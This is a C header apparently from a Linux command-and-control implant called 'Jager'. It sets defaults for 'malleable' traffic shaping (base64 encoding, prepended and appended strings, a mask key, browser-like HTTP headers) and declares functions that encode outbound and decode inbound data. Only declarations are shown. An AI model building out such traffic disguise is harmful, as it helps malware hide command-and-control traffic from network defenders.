#ifndef JAGER_LINUX_MALLEABLE_H
#define JAGER_LINUX_MALLEABLE_H

#include "config.h"

#ifndef MALLEABLE_OUT_BASE64
#define MALLEABLE_OUT_BASE64 0
#endif
#ifndef MALLEABLE_IN_BASE64
#define MALLEABLE_IN_BASE64 0
#endif
#ifndef MALLEABLE_OUT_PREPEND
#define MALLEABLE_OUT_PREPEND ""
#endif
#ifndef MALLEABLE_OUT_APPEND
#define MALLEABLE_OUT_APPEND ""
#endif
#ifndef MALLEABLE_IN_PREPEND
#define MALLEABLE_IN_PREPEND ""
#endif
#ifndef MALLEABLE_IN_APPEND
#define MALLEABLE_IN_APPEND ""
#endif
#ifndef MALLEABLE_MASK_KEY
#define MALLEABLE_MASK_KEY 0
#endif
#ifndef HTTP_HDR_ACCEPT
#define HTTP_HDR_ACCEPT "application/json, text/plain, */*"
#endif
#ifndef HTTP_HDR_ACCEPT_LANGUAGE
#define HTTP_HDR_ACCEPT_LANGUAGE "en-US,en;q=0.9"
#endif

DWORD malleable_encode_outbound(const BYTE *in, DWORD in_len, BYTE *out, DWORD out_cap);
DWORD malleable_decode_inbound(const BYTE *in, DWORD in_len, BYTE *out, DWORD out_cap);
DWORD malleable_build_header_list(char headers[][256], DWORD max_count);
void malleable_build_headers(char *buf, DWORD buf_size);

#endif
